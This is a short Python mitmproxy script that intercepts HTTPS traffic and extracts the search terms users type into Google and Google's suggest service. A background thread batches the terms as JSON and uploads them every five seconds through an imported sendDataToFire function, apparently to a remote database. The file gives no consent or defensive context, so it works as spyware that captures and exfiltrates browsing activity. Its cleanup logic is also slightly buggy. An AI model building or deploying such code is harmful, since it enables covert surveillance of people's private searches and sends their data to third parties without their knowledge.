from mitmproxy import http
from threading import Thread
import re, json, sys, threading, time, signal, os
sys.path.append('../')
from connect import sendDataToFire

data = {
    "google" : [],
    "youtube" : [],
    "web" : []
}

def request(flow: http.HTTPFlow) -> None:
    global data
    if flow.request.host in ["www.google.co.in", "www.google.com", "www.google.co.uk"]:
        if flow.request.url[:32] == "https://www.google.co.in/search?" and flow.request.method == 'GET' :
            s = flow.request.path
            s = s[s.find('q=')+2:]
            s = s[:s.find('&')]
            data["google"].append(s.replace('+', ' '))
            print(data)     
        if (flow.request.url[:50] == "https://suggestqueries.google.com/complete/search?" and flow.request.method == 'GET'):
            ys = flow.request.path
            ys = ys[ys.find('q=')+2:]
            ys = ys[:ys.find('&')]
            data["youtube"].append(ys.replace('+', ' '))
            print(data)
    else:
        #this below is required statment of code           
        #data["web"].append(flow.request.host)
        pass


def clear_data(data):
    len_g = len(data["google"])
    len_y = len(data["youtube"])
    len_w = len(data["web"])
    data["google"] = data["google"][len_g:]
    data["youtube"] = data["youtube"][len_y:]
    data["web"] = data["web"][len_y:]
    return True

def send_to_fire():
    while True:
        try:
            if(len(data["google"])== 0 and len(data["youtube"]) == 0 and len(data["web"]) == 0):
                time.sleep(5)
            else:
                jsond = json.dumps(data)
                sendDataToFire(jsond)
                clear_data(data)
                time.sleep(5)
        except:
            raise Exception
    pass

Thread(target = send_to_fire).start()
    

